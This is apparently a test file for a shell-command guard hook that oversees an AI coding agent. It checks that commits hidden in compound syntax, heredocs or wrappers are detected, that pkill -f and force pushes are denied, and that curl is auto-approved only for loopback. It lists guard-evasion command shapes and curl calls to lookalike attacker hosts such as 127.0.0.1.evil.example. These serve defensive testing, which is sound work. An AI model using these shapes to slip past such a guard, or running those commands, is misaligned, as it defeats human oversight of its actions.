// bash-guard-hardening.test.mjs — the Bash guard fails CLOSED (ledger L12 + M36, 2026-10-09).
//
// The commit guard reads the command with .claude/hooks/shellparse.py and,
// when the parser sees no commit, used to trust it. It answered `[]` for a
// commit inside `if …; then …; fi`, `{ …; }`, a loop body, a line carrying an
// `$(( a << b ))` shift (the heredoc scanner swallowed everything after it)
// and for an unbalanced quote, so test:guards, the ratchet auto-raise and the
// unstaged-tree check were all skipped. These are RUN against the real hook
// (APEX_GUARD_PROBE=1 stops it after the commit has been classified), the way
// agent-config.test.mjs runs the plain forms.
//
// Run: node --test tests/unit/bash-guard-hardening.test.mjs   (npm run test:tooling-fast)
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const HOOK = path.join(ROOT, ".claude/hooks/bash-guard.sh");
const PARSE = path.join(ROOT, ".claude/hooks/shellparse.py");

function scratchRepo(prefix) {
  fs.mkdirSync(path.join(ROOT, "artifacts"), { recursive: true });
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", prefix));
  const g = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
  g("init", "-q"); g("config", "user.email", "t@t"); g("config", "user.name", "t");
  fs.mkdirSync(path.join(dir, "docs"), { recursive: true });
  fs.writeFileSync(path.join(dir, "docs/PHYSICS.md"), "note\n");
  g("add", "-A"); g("commit", "-qm", "init");
  return { dir, g, rm: () => fs.rmSync(dir, { recursive: true, force: true }) };
}

const commitJson = (command) => spawnSync("python3", [PARSE, "commit"], { input: command, encoding: "utf8" }).stdout.trim();

// Shapes where the real commit hides behind shell syntax.
const COMPOUND = [
  "if true; then git commit -m x; fi",
  "if ! git diff --cached --quiet; then git commit -m x; else echo none; fi",
  "{ git commit -m x; }",
  "for i in 1 2; do git commit -m x; done",
  "while true; do git commit -m x; break; done",
  "! git commit -m x",
  "( git commit -m x )",
  "echo $((1 << n))\ngit commit -m x",
  "git \\\n commit -m x",
  "x=`git commit -m x`",
  'eval "git commit -m x"',
];
// Text the parser cannot tokenise at all: the regex fallback must catch them.
const UNPARSEABLE = ['git commit -m "unbalanced', "git commit -m 'it's broken'"];

test("shellparse reports the commit inside every compound-command shape (L12)", () => {
  for (const cmd of COMPOUND) {
    const out = commitJson(cmd);
    assert.notEqual(out, "[]", `shellparse missed the commit in: ${JSON.stringify(cmd)}`);
    assert.equal(JSON.parse(out).length, 1, cmd);
  }
});

test("shellparse says `null` (not `[]`) for text it cannot tokenise, and `[]` for non-commits", () => {
  for (const cmd of UNPARSEABLE) assert.equal(commitJson(cmd), "null", cmd);
  for (const cmd of ["echo 'git commit -m x'", "git log --oneline", "cat <<EOF\nif x; then git commit; fi\nEOF", "read x <<< hi\ngit status"])
    assert.equal(commitJson(cmd), "[]", cmd);
  // a heredoc with its closing line still hides its body; a `<<` with no closing line hides nothing
  assert.equal(commitJson("cat <<EOF\ngit commit -m inside\nEOF\ngit commit -m real").match(/"all"/g).length, 1);
});

test("the guard SEES a commit behind compound syntax or an unparseable line, and still ignores prose", () => {
  const repo = scratchRepo("hook-compound-");
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir, APEX_GUARD_PROBE: "1" },
  });
  try {
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "note 2\n");
    repo.g("add", "docs/PHYSICS.md");
    for (const cmd of ["git commit -m x", ...COMPOUND, ...UNPARSEABLE]) {
      const r = run(cmd);
      assert.equal(r.status, 0, `${JSON.stringify(cmd)}: ${r.stderr}`);
      assert.match(r.stderr, /bash-guard probe: commit/, `the guard must SEE this commit: ${JSON.stringify(cmd)}`);
    }
    // the parser reads the compound forms exactly (a docs-only stage stays docs-only); only unparseable text is the conservative -a path
    for (const cmd of COMPOUND) assert.match(run(cmd).stderr, /probe: commit docs-only/, cmd);
    for (const cmd of UNPARSEABLE) assert.match(run(cmd).stderr, /probe: commit code/, cmd);
    // prose that merely names a commit is still not one
    for (const cmd of ["echo 'if x; then git commit; fi'", "git log --oneline", "git commit --dry-run -m x",
      "cat <<EOF\nif x; then git commit; fi\nEOF", "APEX_SKIP_GUARDS=1 git commit -m x", "git status && echo done"]) {
      const r = run(cmd);
      assert.equal(r.status, 0, cmd);
      assert.doesNotMatch(r.stderr, /probe: commit/, `not a guarded commit: ${JSON.stringify(cmd)}`);
    }
  } finally { repo.rm(); }
});

test("the pkill guard blocks -f however the flags are spelled (M36)", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  for (const cmd of [
    "pkill -9f node", "pkill -u root -f chrome", "pkill --signal 9 -f chrome", "pkill -KILL -f node",
    "pkill -fl chrome", "pkill chrome -f", "pkill -x -9 --full playwright", "sudo pkill -9f chrome",
    "kill -9 $(pgrep -u root -f chrome)", "pgrep -9f chrome | xargs kill",
  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
  for (const cmd of ["pkill -x firefox", "pkill -u root sleep", "echo 'pkill -9f node'", "pgrep -u root bash"])
    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
});

test("settings.json denies a force push or a deploy-branch push however it is spelled (M36)", () => {
  const deny = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8")).permissions.deny
    .filter((d) => d.startsWith("Bash(git push")).map((d) => d.slice("Bash(".length, -1));
  // a permission pattern is a glob: `*` is any run of characters
  const matches = (pat, cmd) => new RegExp("^" + pat.split("*").map((s) => s.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$").test(cmd);
  const denied = (cmd) => deny.some((p) => matches(p, cmd));
  for (const cmd of [
    "git push --force", "git push --force-with-lease origin x", "git push -f origin x",
    "git push origin x --force", "git push origin x --force-with-lease", "git push origin x -f",
    "git push origin +HEAD:cursor/topic", "git push origin +cursor/topic",
    "git push origin claude/f1-game-project-26h3ng", "git push origin HEAD:claude/f1-game-project-26h3ng",
    "git push origin HEAD:refs/heads/claude/f1-game-project-26h3ng",
  ]) assert.ok(denied(cmd), `settings.json must deny: ${cmd}`);
  for (const cmd of ["git push -u origin cursor/ci-adapted-guard-88f2", "git push origin HEAD:cursor/topic-1234", "git push"])
    assert.ok(!denied(cmd), `settings.json must allow: ${cmd}`);
});

test("the SCAN heredoc scanner does not swallow the line after `<<<` or an arithmetic shift (M36 pkill)", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  assert.equal(run("read x <<< hi\npkill -f chrome").status, 2);
  assert.equal(run("echo $((1 << n))\npkill -f chrome").status, 2);
  assert.equal(run("cat <<EOF\npkill -f chrome\nEOF").status, 0, "a real heredoc body is still prose");
});

// 15-F6 / 15-F7 (2026-10-10): the two shapes #1288 left open.
const SHELL_HEREDOCS = [
  "bash <<EOF\ngit commit -am x\nEOF",
  "bash <<'EOF'\ngit add -A && git commit -m \"x\"\nEOF",
  "sh <<EOF\ngit commit -m x\nEOF",
  "cat <<EOF | bash\ngit commit -m x\nEOF",
  "sudo bash -s <<'EOF'\nset -e\ngit commit -m x\nEOF",
];

test("shellparse reads a commit inside a heredoc a shell runs; a plain heredoc stays prose (15-F6)", () => {
  for (const cmd of SHELL_HEREDOCS) {
    const out = commitJson(cmd);
    assert.notEqual(out, "[]", `shellparse missed the commit in: ${JSON.stringify(cmd)}`);
    assert.equal(JSON.parse(out).length, 1, cmd);
  }
  assert.equal(commitJson("cat <<EOF\ngit commit -m x\nEOF"), "[]");
  assert.equal(commitJson("python3 - <<EOF\nprint('git commit')\nEOF"), "[]");
  // the real commit's own message heredoc is still prose, and the commit is still seen once
  assert.equal(JSON.parse(commitJson("git commit -F - <<EOF\nthe message\nEOF")).length, 1);
});

test("the guard SEES a commit in a shell heredoc, even one the parser cannot tokenise (15-F6)", () => {
  const repo = scratchRepo("hook-heredoc-");
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir, APEX_GUARD_PROBE: "1" },
  });
  try {
    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "note 2\n");
    repo.g("add", "docs/PHYSICS.md");
    for (const cmd of [...SHELL_HEREDOCS, "bash <<'EOF'\ngit commit -m \"unbalanced\nEOF"]) {
      const r = run(cmd);
      assert.equal(r.status, 0, `${JSON.stringify(cmd)}: ${r.stderr}`);
      assert.match(r.stderr, /bash-guard probe: commit/, `the guard must SEE this commit: ${JSON.stringify(cmd)}`);
    }
    // a heredoc fed to a non-shell is still prose
    assert.doesNotMatch(run("cat <<EOF\ngit commit -m x\nEOF").stderr, /probe: commit/);
    assert.doesNotMatch(run("python3 - <<EOF\nprint('git commit -m x')\nEOF").stderr, /probe: commit/);
  } finally { repo.rm(); }
});

test("`cd <other tree> && git commit` guards THAT tree, not the hook's own (15-F6)", () => {
  const target = scratchRepo("hook-cd-target-"), home = scratchRepo("hook-cd-home-");
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: home.dir }),
    cwd: home.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: home.dir, APEX_GUARD_PROBE: "1" },
  });
  try {
    // only the TARGET tree has a staged (docs) change; the hook's own tree has nothing staged
    fs.writeFileSync(path.join(target.dir, "docs/PHYSICS.md"), "note 2\n");
    target.g("add", "docs/PHYSICS.md");
    assert.match(run(`cd ${target.dir} && git commit -m x`).stderr, /probe: commit docs-only/);
    assert.match(run(`git -C ${target.dir} commit -m x`).stderr, /probe: commit docs-only/);
    assert.match(run(`cd ${path.dirname(target.dir)} && git -C ${path.basename(target.dir)} commit -m x`).stderr, /probe: commit docs-only/);
    // no cd: the hook's own (empty) tree, so not docs-only
    assert.match(run("git commit -m x").stderr, /probe: commit code/);
  } finally { target.rm(); home.rm(); }
});

test("the pkill guard sees through timeout / xargs / setsid wrappers (15-F7)", () => {
  const run = (command) => spawnSync("bash", [HOOK], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
  });
  for (const cmd of [
    "timeout 5 pkill -f chrome", "timeout -k 2 10s pkill -9f node", "echo chrome | xargs pkill -f", "xargs -n 1 pkill -f playwright < pids",
    "setsid pkill -f chrome", "sudo timeout 5 pkill -f node", "timeout 5 killall chrome",
  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
  for (const cmd of ["timeout 5 sleep 1", "echo a | xargs echo", "timeout 5 pkill -x firefox", "echo 'timeout 5 pkill -f chrome'"])
    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
});

test("settings.json auto-approves curl only to a loopback PORT, never a lookalike host (15-F8, Bryce 2026-10-10)", () => {
  const allow = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8")).permissions.allow
    .filter((d) => d.startsWith("Bash(curl")).map((d) => d.slice("Bash(".length, -1));
  const matches = (pat, cmd) => new RegExp("^" + pat.split("*").map((s) => s.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$").test(cmd);
  const allowed = (cmd) => allow.some((p) => matches(p, cmd));
  for (const cmd of ["curl http://127.0.0.1:3456/version.json", "curl http://localhost:3713/health"])
    assert.ok(allowed(cmd), `settings.json must allow: ${cmd}`);
  for (const cmd of ["curl http://127.0.0.1.evil.example/?d=x", "curl http://127.0.0.1@evil.example/", "curl http://localhost.evil.example/"])
    assert.ok(!allowed(cmd), `settings.json must NOT auto-approve: ${cmd}`);
});
